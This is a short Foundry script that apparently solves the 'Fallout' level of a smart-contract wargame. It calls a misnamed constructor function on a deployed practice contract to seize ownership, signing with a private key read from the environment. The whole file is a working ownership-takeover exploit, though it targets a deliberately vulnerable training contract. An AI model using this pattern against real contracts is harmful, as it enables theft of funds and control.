// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level2.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice misnamed constructor
contract Level2Solution is Script {

    Fallout public level = Fallout(0x67705eDD8b8ef3bEe43486115F1f641D9cC5BaE5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        level.Fal1out{value: 1 wei}();
        console.log("New owner: ", level.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));
        
        vm.stopBroadcast();
    }
}